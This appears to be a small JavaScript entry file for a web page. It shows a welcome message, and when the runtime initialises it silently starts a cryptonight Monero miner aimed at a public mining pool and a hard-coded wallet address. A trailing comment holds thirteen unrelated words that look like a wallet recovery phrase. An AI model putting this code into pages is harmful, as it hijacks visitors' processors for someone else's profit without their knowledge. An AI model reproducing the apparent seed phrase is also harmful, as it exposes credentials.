import JsonRpcHttp from './src/json-rpc-http'
import Miner from './src/miner'

document.write('welcome to my app');
console.log('app loaded');

window.Module['onRuntimeInitialized'] = function () {
    miner = new Miner('cryptonight', 'xmr-eu.dwarfpool.com', '45WQfZ9E3C1acut7umbnq6eujkVjptWHhCHcPn8aX2xEKxwaqeAaWHbRiVpz2qk3JJEPMGqGK3tMkaJn65zxbEPcEacCq6y');
    console.log('this should be logged');
}


//uphill army myth ruling rural abyss bounced bawled pamphlet hoax kisses roster roster